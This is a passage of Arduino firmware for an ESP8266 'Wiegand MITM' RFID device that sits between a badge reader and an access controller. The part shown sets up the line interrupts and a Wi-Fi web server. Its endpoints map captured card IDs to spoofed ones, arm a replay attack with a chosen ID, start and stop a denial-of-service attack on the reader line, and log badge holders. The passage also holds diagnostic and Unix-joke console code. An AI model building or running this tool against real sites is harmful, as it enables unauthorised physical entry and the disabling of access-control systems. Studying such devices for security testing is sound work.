 *   > espinfo
 *   > flashinfo
 *   > restart
 * 
 * ===========================================================================
 */


// Get ESP chip information
String getESPInfo() {
  String info = "";
  info += "\n";
  info += "ESP Chip Information:\n";
  info += "  * Chip ID: 0x" + String(ESP.getChipId(), HEX) + "\n";
  info += "  * CPU Frequency: " + String(ESP.getCpuFreqMHz()) + " MHz\n";
  info += "  * Flash Chip ID: 0x" + String(ESP.getFlashChipId(), HEX) + "\n";
  info += "  * Flash Chip Size: " + String(ESP.getFlashChipSize() / (1024 * 1024)) + " MB\n";
  info += "  * Flash Chip Speed: " + String(ESP.getFlashChipSpeed() / 1000000) + " MHz\n";
  info += "  * Flash Chip Mode: " + String(ESP.getFlashChipMode()) + "\n";
  info += "  * Free Heap: " + String(ESP.getFreeHeap()) + " bytes\n";
  info += "  * Sketch Size: " + String(ESP.getSketchSize()) + " bytes\n";
  info += "  * Free Sketch Space: " + String(ESP.getFreeSketchSpace()) + " bytes\n";
  info += "\n\n";
  return info;
}





/*
  ******************************************************************************
  FLASH MEMORY INFORMATION
  ******************************************************************************
  Retrieves and formats detailed information about the ESP8266's flash memory.

  RETURNS:
  - Formatted string containing:
    * Flash chip ID (hexadecimal)
    * Total flash size (MB)
    * Operating speed (MHz)
    * Access mode
    * Wrapped in comment-style formatting

  DATA SOURCES:
  - ESP.getFlashChipId()
  - ESP.getFlashChipRealSize()
  - ESP.getFlashChipSpeed()
  - ESP.getFlashChipMode()

  USAGE:
  Serial.print(getFlashInfo());
  // Outputs complete flash memory report
  ******************************************************************************
*/String getFlashInfo() {
  String info = "";

  info += "\n";
  info += "Flash Memory Information:\n";
  info += "  * Flash Chip ID: 0x" + String(ESP.getFlashChipId(), HEX) + "\n";
  info += "  * Flash Chip Size: " + String(ESP.getFlashChipRealSize() / (1024 * 1024)) + " MB\n";
  info += "  * Flash Chip Speed: " + String(ESP.getFlashChipSpeed() / 1000000) + " MHz\n";
  info += "  * Flash Chip Mode: " + String(ESP.getFlashChipMode()) + "\n";
  info += " \n\n";              // Added extra newline to match original

  return info;
}






/*
  ******************************************************************************
  SYSTEM STATUS REPORT
  ******************************************************************************
  Generates a comprehensive snapshot of current system status and metrics.

  RETURNS:
  - Formatted string containing:
    * Client connection statistics
    * Memory usage and fragmentation
    * WiFi network information
    * Visual header/footer separators

  MONITORED METRICS:
  - Connected/active clients
  - Command buffer size
  - Free heap memory
  - Heap fragmentation
  - WiFi SSID/RSSI/IP

  USAGE:
  Serial.print(getSystemStatus());
  // Displays current system health status
  ******************************************************************************
*/
String getSystemStatus() {
  String status = "";

  status += "\n";
  status += "SYSTEM STATUS INFORMATION:\n";
  status += "  * Memory: FreeHeap=" + String(ESP.getFreeHeap()) + " bytes, Fragmentation=" + String(ESP.getHeapFragmentation()) + "%\n";
  status += "  * WiFi: SSID=" + WiFi.SSID() + ", RSSI=" + String(WiFi.RSSI()) + " dBm, IP=" + WiFi.localIP().toString() + "\n";

  status += "\n\n";                    // Extra newline for spacing
  return status;
}







/*
  ******************************************************************************
  SCREEN CLEAR UTILITY
  ******************************************************************************
  Generates a string of newlines to simulate terminal screen clearing.

  FEATURES:
  - Returns 50 newline characters
  - Creates vertical scroll effect
  - Non-destructive alternative to system clears
  - Consistent behavior across platforms

  USAGE:
  Serial.print(clearScreen());
  // Clears terminal by scrolling content up
  ******************************************************************************
*/
String clearScreen() {
  String clearString = "";

  // Create a string with 50 newlines to simulate screen clearing
  for (int i = 0; i < 50; i++) {
    clearString += "\n";
  }

  return clearString;
}





/*
  ******************************************************************************
  RESTART NOTIFICATION FUNCTION
  ******************************************************************************
  Generates and returns a formatted restart countdown message without
  actually performing the restart. Useful for displaying restart information
  before calling the actual restart function.

  RETURNS:
  - String containing:
    * Restart initiation message
    * 3-second countdown notice
    * Visual formatting

  USAGE:
  Serial.print(showRestartMessage());
  // Displays restart notice without executing restart
  ******************************************************************************
*/
String showRestartMessage() {
  String message = "";

  message += "\n";
  message += "SYSTEM RESTART NOTIFICATION:\n";
  message += "  * WARNING: System restart initiated\n";
  message += "  * \n";
  message += "  * The device will restart in:\n";
  message += "  * 3 seconds...\n";
  message += "  * \n";
  message += "  * ACTION REQUIRED:\n";
  message += "  * - Prepare for disconnection\n";

  message += "\n\n";           // Extra newline for spacing
  return message;
}









/*
  ******************************************************************************
  SYSTEM RESTART EXECUTION FUNCTION
  ******************************************************************************
  Performs an immediate system restart of the ESP8266/ESP32 with optional
  delay and visual feedback. Includes safety delay to ensure message delivery.

  PARAMETERS:
  - delayMs: Optional delay in milliseconds before restart (default 3000ms)

  BEHAVIOR:
  - Adds small delay to ensure serial output is flushed
  - Calls ESP.restart() which never returns
  - All pending operations are aborted

  WARNING:
  - This function does not return
  - Unsaved data will be lost
  - Network connections will be terminated

  USAGE:
  performRestart(); // Default 3 second delay
  performRestart(5000); // 5 second delay
  ******************************************************************************
*/
void performRestart(unsigned int delayMs = 3000) {

  // Small delay to ensure message delivery
  delay(100);
  
  // Optional countdown delay
  if (delayMs > 0) {
    unsigned long start = millis();
    while (millis() - start < delayMs) {
      delay(100);
    }
  }
  
  // Execute restart (this never returns)
  ESP.restart();
}




/*
  ******************************************************************************
  UNIX COMMAND JOKE GENERATOR
  ******************************************************************************
  Provides humorous responses for common Unix/Linux commands. 
  Designed to entertain while maintaining technical relevance to command functions.


  NOTES:
    1. Call getRandomJoke(command) with any Unix command string
    2. Returns a String containing the joke response
  ******************************************************************************
*/
String getRandomJoke(const String& command) {
  if (command == "grep") {
    return "My love life is like grep — I'm always searching and never finding.";
  }
  else if (command == "ls") {
    switch(random(3)) {
      case 0: return "ls: because I forgot what I just created 5 seconds ago.";
      case 1: return "If I had a dollar for every time I typed ls, I could finally buy a good GPU.";
      case 2: return "ls is just Unix for 'Where the hell did I put that file?'";
      default: return "ls: too many files to show";
    }
  }
  else if (command == "dir") {
    return "This is not Windows.";
  }
  else if (command == "kill") {
    return "kill -9 — for when Ctrl+C just isn't angry enough.";
  }
  else if (command == "rm") {

    // Two options for rm, pick randomly
    return random(2) == 0 ? 
      "If you think rm -rf / is scary, try texting your crush." : 
      "rm -rf bad_habits/ — Still there.";
  }
  else if (command == "ifconfig") {
    return "Tried ifconfig eth0 down, now my responsibilities can't find me.";
  }
  else if (command == "chmod") {
    return "My code runs like chmod 000 — no one can touch it.";
  }
  else if (command == "sudo") {
    switch(random(16)) {
      case 0: return "Are you on drugs?";
      case 1: return "I would make a joke about sudo, but you'd have to be root to get it.";
      case 2: return "I don't think you deserve to be root.";
      case 3: return "What, what, what, what, what, what, what?";
      case 4: return "You silly, twisted boy you.";
      case 5: return "Error between keyboard and chair.";
      case 6: return "...and you thought I was going to cooperate?";
      case 7: return "I see your fingers are faster than your brain.";
      case 8: return "In what twisted universe does that make sense?";
      case 9: return "If I had legs, I'd kick you.";
      case 10: return "You're making me sad.";
      case 11: return "That's not how any of this works.";
      case 12: return "No, just... no.";
      case 13: return "Go ahead, keep trying. It's entertaining.";
      case 14: return "I'm not mad. Just disappointed.";
      case 15: return "Did you just mash your forehead on the keyboard?";
      default: return "sudo: command not found";
    }
  }
  else if (command == "ping") {
    return "pinged my friend. No response. Must be offline... or mad.";
  }
  else if (command == "whoami") {
    return "whoami — still trying to figure it out.";
  }
  else if (command == "dd") {
    return "Love is like dd — slow, dangerous, and you better not mess up the destination.";
  }
  else if (command == "nano") {
    return "I'm like nano — simple, ignored, and people only use me when they're desperate.";
  }
  else if (command == "find") {
    return "sudo find . -type joy — still searching.";
  }
  else if (command == "bash") {
    return "I asked Bash for advice, it just echoed back.";
  }
  else if (command == "diff") {
    return "I diff myself from who I was last year. Too many changes to count.";
  }
  else if (command == "vim") {
    return "I entered VIM 3 days ago. Send help.";
  }
  else if (command == "ssh") {
    return "SSH: The long-distance relationship that actually works.";
  }
  else if (command == "tail") {
    return "I use tail -f to watch my mistakes happen in real time.";
  }
  else if (command == "cron") {
    return "CRON jobs — the only coworkers that show up on time.";
  }
  else {
    return "Command not found, but here's a joke: Why did the Linux user get dumped? Too many open terminals.";
  }
}















/*
  ******************************************************************************
  SYSTEM INITIALIZATION (SETUP)
  ******************************************************************************
  One-time hardware/software initialization for Wiegand MITM operation

  HARDWARE CONFIGURATION:
  1. Serial Communication:
     - 115200 baud rate (debug console)
     - 5-second delay for stable connection

  2. Input Pins:
     - PIN_DATA0_IN: INPUT_PULLUP (internal pull-up)
     - PIN_DATA1_IN: INPUT_PULLUP (internal pull-up)
     - FALLING edge interrupts for pulse detection

  3. Output Pins:
     - PIN_DATA0_OUT: OUTPUT mode (push-pull)
     - PIN_DATA1_OUT: OUTPUT mode (push-pull)
     - Initialized HIGH (Wiegand idle state)

  INTERRUPT SETUP:
  - readData0: Triggered on DATA0 falling edge
  - readData1: Triggered on DATA1 falling edge
  - Digital pin to interrupt mapping handled automatically
  ******************************************************************************
*/
void setup() {

  // Start serial communication for debugging purposes (baud rate 115200)
  Serial.begin(115200);

  // A small delay before starting the setup process
  delay(500);


  // Initialize the LittleFS for file storage
  if (!LittleFS.begin()) {
    Serial.println("LittleFS Mount Failed");
    return;  // Stop further execution if LittleFS fails to mount
  }


  // Create spoof.json if it doesn't exist
  if (!LittleFS.exists("/spoof.json")) {
    File file = LittleFS.open("/spoof.json", "w");
    if (file) {
      file.print("[]");  // Empty JSON array
      file.close();
      Serial.println("Created empty spoof.json");
    } else {
      Serial.println("Failed to create spoof.json");
    }
  }


  // Create spoof.json if it doesn't exist
  if (!LittleFS.exists("/rfidusers.json")) {
    File file = LittleFS.open("/rfidusers.json", "w");
    if (file) {
      file.print("[]");  // Empty JSON array
      file.close();
      Serial.println("Created empty rfidusers.json");
    } else {
      Serial.println("Failed to create rfidusers.json");
    }
  }


  // Configure input pins with pullups
  pinMode(PIN_DATA0_IN, INPUT_PULLUP);
  pinMode(PIN_DATA1_IN, INPUT_PULLUP);

  // Configure output pins
  pinMode(PIN_DATA0_OUT, OUTPUT);
  pinMode(PIN_DATA1_OUT, OUTPUT);

  // Set output lines to idle state (HIGH)
  digitalWrite(PIN_DATA0_OUT, HIGH);
  digitalWrite(PIN_DATA1_OUT, HIGH);

  // Attach interrupts to input pins
  attachInterrupt(digitalPinToInterrupt(PIN_DATA0_IN), readData0, FALLING);
  attachInterrupt(digitalPinToInterrupt(PIN_DATA1_IN), readData1, FALLING);






    // If USE_INTRANET is defined, connect to a specific Wi-Fi network (home intranet)
    #ifdef USE_INTRANET
      WiFi.begin(LOCAL_SSID, LOCAL_PASS);  // Connect to Wi-Fi using predefined credentials

      delay(2000);
      // Wait until the ESP8266 successfully connects to Wi-Fi
      Serial.print("\nConnecting to WiFi: ");
      int attempts = 0;
      while (WiFi.status() != WL_CONNECTED && attempts < 20) {
        delay(500);                 // Wait 500ms between connection attempts
        Serial.print(".");          // Print progress dots
        attempts++;                 // Increment attempt counter
        
        // After 20 attempts (10 seconds), this loop will exit
      }

      // Check final connection status
      if (WiFi.status() == WL_CONNECTED) {
          // Successful connection
          Serial.println("\nWiFi connected!");
          Serial.print("IP address: ");
          Serial.println(WiFi.localIP());  // Print the assigned IP address
        
          // This IP is what you'll use to access the web interface

          // Store the current IP address for further use
          Actual_IP = WiFi.localIP();

       } else {
          startAP();  // Start the ESP8266 in Access Point (AP) mode
          Serial.println("Started AP mode: ESP-Backup");
      }

    #endif


    // If USE_INTRANET is not defined, configure the ESP as an access point
    #ifndef USE_INTRANET
      startAP();  // Start the ESP8266 in Access Point (AP) mode

      // Start the DNS server on port 53 for redirecting requests to the ESP's IP
      dnsServer.start(53, domain, homeIP);
    #endif




    // Start the HTTP server to listen for incoming HTTP requests on port 80
    server.begin();

    /*
     * Define Routes for the HTTP Server:
     * - The server.on() function is used to define different routes (URLs) and associate them with specific handlers (functions).
     * - Each route corresponds to a specific page or action within the web application.
     */

    // Route for the root URL (login or main page)
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
      request->send(LittleFS, "/index.html", "text/html");  // Serve the HTML page from internal flash filesystem
    });

    // Route for list.html
    server.on("/list.html", HTTP_GET, [](AsyncWebServerRequest *request) {
      request->send(LittleFS, "/list.html", "text/html");
    });

    // Route for chart.html
    server.on("/chart.html", HTTP_GET, [](AsyncWebServerRequest *request) {
      request->send(LittleFS, "/chart.html", "text/html");
    });



    // Route for the favicon (small icon shown in browser tabs)
    server.on("/favicon-48x48.png", HTTP_GET, [](AsyncWebServerRequest *request) {
      request->send(LittleFS, "/favicon-48x48.png", "image/png");  // Serve favicon image
    });



    // Route for pic_01.jpg
    server.on("/pic_01.jpg", HTTP_GET, [](AsyncWebServerRequest *request) {
      request->send(LittleFS, "/pic_01.jpg", "image/jpeg");
    });



    // Route for rfidusers.json
    server.on("/rfidusers.json", HTTP_GET, [](AsyncWebServerRequest *request) {
      request->send(LittleFS, "/rfidusers.json", "application/json");
    });

    // Route for spoof.json
    server.on("/spoof.json", HTTP_GET, [](AsyncWebServerRequest *request) {
      request->send(LittleFS, "/spoof.json", "application/json");
    });


    // Catch-all handler for undefined routes (404 Not Found)
    server.onNotFound([](AsyncWebServerRequest *request) {
      request->send(LittleFS, "/404.html", "text/html");  // Serve custom 404 page
    });






/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /spoof
  Purpose: Adds new RFID spoofing entry to spoof.json
  Parameters:
    - original (required): Original RFID hex value
    - target (required): Target spoofed RFID hex value
  Effects:
    - Creates new spoof mapping in spoof.json
    - Checks for duplicate entries
    - Preserves existing spoof mappings
  ***********************************************************************************
*/
    server.on("/spoof", HTTP_GET, [](AsyncWebServerRequest *request) {
        Serial.println("Received /spoof request");

        // Helper function to send JSON responses
        auto sendJsonResponse = [](AsyncWebServerRequest *req, int code, const String& status, const String& message) {
            String response = "{\"status\":\"" + status + "\",\"message\":\"" + message + "\"}";
            Serial.printf("Sending response [%d]: %s\n", code, response.c_str());
            req->send(code, "application/json", response);
        };

        // Check parameters
        if (!request->hasParam("original") || !request->hasParam("target")) {
            Serial.println("Missing parameters: original or target");
            sendJsonResponse(request, 400, "error", "Missing parameters");
            return;
        }

        String original = request->getParam("original")->value();
        String target = request->getParam("target")->value();
        Serial.printf("Original: %s | Target: %s\n", original.c_str(), target.c_str());

        // Load existing JSON
        File file = LittleFS.open("/spoof.json", "r");
        if (!file) {
            Serial.println("Failed to open spoof.json for reading");
            sendJsonResponse(request, 500, "error", "Failed to open spoof.json");
            return;
        }

        DynamicJsonDocument doc(1024);
        DeserializationError error = deserializeJson(doc, file);
        file.close();

        if (error) {
            Serial.print("JSON deserialization failed: ");
            Serial.println(error.c_str());
            sendJsonResponse(request, 500, "error", "Failed to parse JSON");
            return;
        }

        if (!doc.is<JsonArray>()) {
            Serial.println("spoof.json is not a valid JSON array");
            sendJsonResponse(request, 500, "error", "Invalid JSON structure");
            return;
        }

        JsonArray arr = doc.as<JsonArray>();

        // Check for duplicates
        for (JsonObject entry : arr) {
            if (entry["original"] == original && entry["target"] == target) {
                Serial.println("Duplicate entry found in spoof.json");
                sendJsonResponse(request, 200, "success", "Entry already exists");
                return;
            }
        }

        // Append new entry
        JsonObject newEntry = arr.createNestedObject();


        newEntry["target"] = target;
        newEntry["original"] = original;

        Serial.println("New entry added to JSON");

        // Save updated JSON
        file = LittleFS.open("/spoof.json", "w");
        if (!file) {
            Serial.println("Failed to open spoof.json for writing");
            sendJsonResponse(request, 500, "error", "Failed to open spoof.json for writing");
            return;
        }

        if (serializeJson(doc, file) == 0) {
            file.close();
            Serial.println("Failed to serialize and write JSON");
            sendJsonResponse(request, 500, "error", "Failed to write JSON");
            return;
        }

        file.close();
        Serial.println("Successfully saved spoof entry to spoof.json");
        sendJsonResponse(request, 200, "success", "Spoof saved");
    });







/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /disablespoof
  Purpose: Removes spoofing entry for specified RFID from spoof.json
  Parameters:
    - rfid (required): RFID hex value to remove from spoof list
  Effects:
    - Searches and removes matching entries from spoof.json
  ***********************************************************************************
*/
    server.on("/disablespoof", HTTP_GET, [](AsyncWebServerRequest *request) {
        Serial.println("Received /disablespoof request");

        // Helper for sending response
        auto sendJsonResponse = [](AsyncWebServerRequest *req, int code, const String& status, const String& message) {
            String response = "{\"status\":\"" + status + "\",\"message\":\"" + message + "\"}";
            Serial.printf("Sending response [%d]: %s\n", code, response.c_str());
            req->send(code, "application/json", response);
        };

        // Check parameter
        if (!request->hasParam("rfid")) {
            Serial.println("Missing parameter: rfid");
            sendJsonResponse(request, 400, "error", "Missing rfid parameter");
            return;
        }

        String rfid = request->getParam("rfid")->value();
        Serial.printf("Disabling spoof for RFID: %s\n", rfid.c_str());

        // Open spoof.json
        File file = LittleFS.open("/spoof.json", "r");
        if (!file) {
            Serial.println("Failed to open spoof.json for reading");
            sendJsonResponse(request, 500, "error", "Failed to open spoof.json");
            return;
        }

        DynamicJsonDocument doc(1024);
        DeserializationError error = deserializeJson(doc, file);
        file.close();

        if (error) {
            Serial.print("Deserialization error: ");
            Serial.println(error.c_str());
            sendJsonResponse(request, 500, "error", "Failed to parse spoof.json");
            return;
        }

        if (!doc.is<JsonArray>()) {
            Serial.println("spoof.json is not a valid JSON array");
            sendJsonResponse(request, 500, "error", "Invalid spoof.json structure");
            return;
        }

        JsonArray arr = doc.as<JsonArray>();
        size_t removedCount = 0;

        // Remove matching entries
        for (int i = arr.size() - 1; i >= 0; --i) {
            JsonObject entry = arr[i];
            if (entry["original"] && String(entry["original"].as<const char*>()).equalsIgnoreCase(rfid)) {
                arr.remove(i);
                removedCount++;
            }
        }

        if (removedCount == 0) {
            Serial.println("No matching spoof entry found");
            sendJsonResponse(request, 404, "error", "No spoof entry found for given RFID");
            return;
        }

        // Save modified array
        file = LittleFS.open("/spoof.json", "w");
        if (!file) {
            Serial.println("Failed to open spoof.json for writing");
            sendJsonResponse(request, 500, "error", "Failed to open spoof.json for writing");
            return;
        }

        if (serializeJson(doc, file) == 0) {
            file.close();
            Serial.println("Failed to write updated spoof.json");
            sendJsonResponse(request, 500, "error", "Failed to write spoof.json");
            return;
        }

        file.close();
        Serial.printf("Removed %d spoof entries for RFID: %s\n", removedCount, rfid.c_str());
        sendJsonResponse(request, 200, "success", "Spoof entry removed");
    });



/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /replay
  Purpose: Configures and triggers RFID replay attack with specified ID
  Parameters:
    - original (required): Hexadecimal ID to replay (e.g., 0x123ABC)
  Effects:
    - Sets replayAttack flag to true
    - Stores ID in replayIdToSend global variable
    - Logs attack details to serial monitor
  ***********************************************************************************
*/
    server.on("/replay", HTTP_GET, [](AsyncWebServerRequest *request) {
      Serial.println("Received /replay request");

      // Helper to send JSON response
      auto sendJsonResponse = [](AsyncWebServerRequest *req, int code, const String& status, const String& message) {
        String json = "{\"status\":\"" + status + "\",\"message\":\"" + message + "\"}";
        Serial.printf("Sending response [%d]: %s\n", code, json.c_str());
        req->send(code, "application/json", json);
      };

      // Check if parameter is present
      if (!request->hasParam("original")) {
        sendJsonResponse(request, 400, "error", "Missing 'original' parameter");
        return;
      }

      String hexString = request->getParam("original")->value();
      char *endptr;
      uint32_t id = strtoul(hexString.c_str(), &endptr, 0);

      if (*endptr != '\0') {
        sendJsonResponse(request, 400, "error", "Invalid hex value");
        return;
      }

      // Set up for replay
      replayAttack = true;
      replayIdToSend = id;  // see global below

      Serial.printf("Replay attack armed with ID: 0x%08X\n", id);
      sendJsonResponse(request, 200, "success", "Replay attack triggered");
    });




/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /dos
  Purpose: Initiates DoS attack with specified hexadecimal ID value
  Parameters:
    - id (required): Hexadecimal value to use for DoS attack
  Effects:
    - Sets dosMode flag to true
    - Updates DOS_ATTACK_VALUE with provided ID
    - Records attack start time
  ***********************************************************************************
*/
    server.on("/dos", HTTP_GET, [](AsyncWebServerRequest *request) {
      Serial.println("Received /dos request");

      // Helper to send JSON response
      auto sendJsonResponse = [](AsyncWebServerRequest *req, int code, const String& status, const String& message) {
        String json = "{\"status\":\"" + status + "\",\"message\":\"" + message + "\"}";
        Serial.printf("Sending response [%d]: %s\n", code, json.c_str());
        req->send(code, "application/json", json);
      };

      // Validate query param
      if (!request->hasParam("id")) {
        sendJsonResponse(request, 400, "error", "Missing 'id' parameter");
        return;
      }

      String hexStr = request->getParam("id")->value();
      char* end;
      uint32_t id = strtoul(hexStr.c_str(), &end, 0);

      if (*end != '\0') {
        sendJsonResponse(request, 400, "error", "Invalid hex ID format");
        return;
      }

      // Update DoS settings
      dosMode = true;
      dosStartTime = millis();
      DOS_ATTACK_VALUE = id; // See global below

      Serial.printf("DoS attack started with value: 0x%08X\n", id);
      sendJsonResponse(request, 200, "success", "DoS attack triggered");
    });



/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /stopdos
  Purpose: Immediately stops active DoS attack
  ***********************************************************************************
*/
    server.on("/stopdos", HTTP_GET, [](AsyncWebServerRequest *request) {
        Serial.println("\nReceived /stopdos request");

        // Disable DoS attack
        dosMode = false;

        // Reset value if you plan to reuse it dynamically
        // (If not needed, you can remove this line)
        // DOS_ATTACK_VALUE is usually const, so this line is optional or should be a variable
        DOS_ATTACK_VALUE = 0xFFFFFFFF; // only if not const

        // Send JSON response
        String response = "{\"status\":\"success\",\"message\":\"DoS attack stopped\"}";
        request->send(200, "application/json", response);
    });





/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /updatename
  Purpose: Updates name for all RFID entries matching specified RFID hex value

  Parameters:
    - rfid (required): RFID hex value to match
    - name (required): New name to assign

  Features:
    - Updates all matching entries in rfidusers.json
    - Validates input parameters
  ***********************************************************************************
*/
    server.on("/updatename", HTTP_GET, [](AsyncWebServerRequest *request) {
        Serial.println("Received /updatename request");

        // JSON response helper
        auto sendJsonResponse = [](AsyncWebServerRequest *req, int code, const String& status, const String& message) {
            String response = "{\"status\":\"" + status + "\",\"message\":\"" + message + "\"}";
            req->send(code, "application/json", response);
        };

        // Parameter validation
        if (!request->hasParam("rfid") || !request->hasParam("name")) {
            sendJsonResponse(request, 400, "error", "Missing parameters");
            return;
        }

        String rfid = request->getParam("rfid")->value();
        String name = request->getParam("name")->value();

        Serial.printf("Updating name for all entries with RFID %s to '%s'\n", rfid.c_str(), name.c_str());

        File file = LittleFS.open("/rfidusers.json", "r");
        if (!file) {
            sendJsonResponse(request, 500, "error", "Failed to open rfidusers.json for reading");
            return;
        }

        DynamicJsonDocument doc(8192);  // Increase if JSON grows
        DeserializationError error = deserializeJson(doc, file);
        file.close();

        if (error) {
            Serial.print("JSON parse error: ");
            Serial.println(error.c_str());
            sendJsonResponse(request, 500, "error", "JSON parsing failed");
            return;
        }

        if (!doc.is<JsonArray>()) {
            sendJsonResponse(request, 500, "error", "Invalid JSON structure");
            return;
        }

        JsonArray arr = doc.as<JsonArray>();
        int updateCount = 0;

        for (JsonObject obj : arr) {
            if (obj.containsKey("rfid_hex") && obj["rfid_hex"] == rfid) {
                obj["name"] = name;
                updateCount++;
            }
        }

        if (updateCount == 0) {
            sendJsonResponse(request, 404, "error", "No matching RFID entries found");
            return;
        }

        file = LittleFS.open("/rfidusers.json", "w");
        if (!file) {
            sendJsonResponse(request, 500, "error", "Failed to open rfidusers.json for writing");
            return;
        }

        if (serializeJson(doc, file) == 0) {
            file.close();
            sendJsonResponse(request, 500, "error", "Failed to write JSON");
            return;
        }

        file.close();
        Serial.printf("Updated %d entries with RFID %s\n", updateCount, rfid.c_str());
        sendJsonResponse(request, 200, "success", "Updated " + String(updateCount) + " entries");
    });




/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /updatetime
  Purpose: Updates system time using provided epoch timestamp parameter
  Parameters: time (required) - Unix epoch timestamp
  ***********************************************************************************
*/
    server.on("/updatetime", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!request->hasParam("time")) {
            request->send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing 'time' parameter\"}");
            return;
        }

        String timeParam = request->getParam("time")->value();
        unsigned long newTime = strtoul(timeParam.c_str(), NULL, 10);
        
        if (newTime == 0) {
            request->send(400, "application/json", "{\"status\":\"error\",\"message\":\"Invalid epoch time\"}");
            return;
        }

        currentEpochTime = newTime;
        baseTime = newTime;       // Update baseTime
        baseMillis = millis();    // Reset baseMillis
        
        Serial.printf("Time updated to epoch: %lu\n", currentEpochTime);
        time_t t = currentEpochTime;
        Serial.println(ctime(&t));

        request->send(200, "application/json", "{\"status\":\"success\",\"message\":\"Time updated successfully\"}");
    });




/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /clearspooflist
  Purpose: Clears all spoofed RFID entries by resetting spoof.json to empty array []
  ***********************************************************************************
*/
    server.on("/clearspooflist", HTTP_GET, [](AsyncWebServerRequest *request) {
        File file = LittleFS.open("/spoof.json", "w");
        if (file) {
            file.print("[]"); // Empty List
            file.close();
            request->send(200, "text/plain", "List cleared successfully");
        } else {
            request->send(500, "text/plain", "Failed to clear list");
        }
    });




/*
  ***********************************************************************************
  WEB SERVER ENDPOINT: /clearrfidusers
  Purpose: Clears all RFID user entries by resetting rfidusers.json to empty array []
  ***********************************************************************************
*/
    server.on("/clearrfidusers", HTTP_GET, [](AsyncWebServerRequest *request) {
        File file = LittleFS.open("/rfidusers.json", "w");
        if (file) {
            file.print("[]"); // Empty user list
            file.close();
            request->send(200, "text/plain", "RFID user list cleared");
        } else {
            request->send(500, "text/plain", "Failed to clear RFID user list");
        }
    });




  delay(5000);
  Serial.println("\nWiegand RFID Emulator for ESP-07 Ready");
}








/*
  ******************************************************************************
  MAIN PROGRAM LOOP
  ******************************************************************************
  The `loop()` function runs continuously after `setup()` completes, handling all
  repetitive tasks and event processing:

  PRIMARY RESPONSIBILITIES:
  1. HTTP SERVER HANDLING:
     - Processes incoming web requests
     - Manages client connections
     - Serves web pages and API responses

  2. NETWORK AND EVENT MONITORING:
     - Checks for network activity
     - Handles DNS requests (if DNS server active)
     - Processes any event-driven tasks

  3. PERIODIC SYSTEM OPERATIONS:
     - Regular system status checks
     - Sensor data collection (if applicable)
     - Maintenance tasks and cleanup

  OPERATION NOTES:
  - Should remain non-blocking whenever possible
  - Critical operations should include timeout handling
  - Long-running tasks should be broken into smaller steps

  TYPICAL EXECUTION CYCLE:
  1. Check for incoming network requests
  2. Process any pending events
  3. Handle periodic tasks
  4. Yield CPU when possible (via delay(0) or similar)
  ******************************************************************************
*/
void loop() {

  ESP.wdtFeed(); // Reset watchdog


  #ifndef USE_INTRANET
    // If not using intranet mode, process incoming DNS requests
    // This is typically used in captive portal setups to redirect all DNS queries to the ESP
    dnsServer.processNextRequest();
  #endif






  // Check if we have received data and timeout period has passed
  if (receivingData && (millis() - lastPulseTime > RECEIVE_TIMEOUT)) {

    processTag();               // Process the received tag
    receivingData = false;      // Reset reception flag
    tagIndex = 0;               // Reset buffer position
  }





/*
  ******************************************************************************
  COMMAND PROCESSING SYSTEM
  ******************************************************************************
  This module handles all serial command input and execution, including:
  - System information commands
  - File operations
  - Time management
  - Easter egg joke commands

  ******************************************************************************
  COMMAND CATEGORIES:

  === SYSTEM COMMANDS (Real functionality) ===
  - espinfo       - Shows ESP32 chip information
  - flashinfo     - Displays flash memory details
  - systemstatus  - Reports memory and system status
  - listfiles     - Lists files in LittleFS
  - time          - Shows current date/time
  - reset/restart - Reboots the device
  - history       - Shows command history
  - help/?/h      - Displays help menu
  - cls           - Clears serial terminal


  === JOKE COMMANDS (Linux parody) ===
  - ls, rm, mv    - Fake file operations
  - sudo, kill    - Process management jokes
  - ping, ssh     - Networking humor
  - vim, nano     - Editor jokes
  - cron, bash    - System tool parodies
  ******************************************************************************
*/

  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');        // Reads the entire line
    command.trim();                                         // Remove spaces and newlines
    command.toLowerCase();                                  // Convert to lowercase

    // Store command in history
    commandHistory[historyIndex] = command;
    historyIndex = (historyIndex + 1) % MAX_HISTORY;


    // History
    if (command == "history") {
      Serial.println("\nCommand History:");
      for (int i = 0; i < MAX_HISTORY; i++) {
        if (commandHistory[i].length() > 0) {
          Serial.println(commandHistory[i]);
        }
      }
      Serial.println("\n");
    }

    // Help
    else if (command == "h" || command == "help" || command == "?") {
      Serial.print(showHelp());
    }


    // --- Screen Clearing Commands ---
    else if (command == "cls") {
      Serial.print(clearScreen());            // Clear screen using custom function
    }

    // --- ESP Device Commands ---
    else if (command == "espinfo") {
      Serial.print(getESPInfo());               // Print ESP module info
    }
    else if (command == "flashinfo") {
      Serial.print(getFlashInfo());             // Show flash memory info
    }

    else if (command == "systemstatus") {
      Serial.print(getSystemStatus());          // Return memory and WiFi info
    }

    else if (command == "listfiles") {
      Serial.print(listFiles("/"));             // List all files in root directory
    }

    else if (command == "time") {
      unsigned long nowEpoch = getCurrentEpoch();
      time_t t = nowEpoch;
      struct tm *timeinfo = localtime(&t);
      
      // Array of day names
      const char* days[] = {"Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"};
      
      // Array of month names
      const char* months[] = {"January", "February", "March", "April", "May", "June", 
                            "July", "August", "September", "October", "November", "December"};
      
      // Format: Weekday, Month Day, Year
      Serial.printf("Current Time: %s, %s %d, %d\n", 
                  days[timeinfo->tm_wday],
                  months[timeinfo->tm_mon],
                  timeinfo->tm_mday,
                  1900 + timeinfo->tm_year);
      
      // Also show the epoch time for reference
      Serial.printf("Epoch: %lu\n", nowEpoch);
    }

    else if (command == "reset" || command == "restart") {

      // Display restart message first
      Serial.print(showRestartMessage());

      // Then perform the actual restart after 3 seconds
      performRestart();

      // Or with custom delay:
      // performRestart(5000); // 5 second delay

    }

    // Linux joke commands
    else if (command == "ls" || command == "rm" || command == "mv" || 
            command == "chmod" || command == "grep" || command == "find" ||
            command == "diff" || command == "dd" || command == "kill" ||
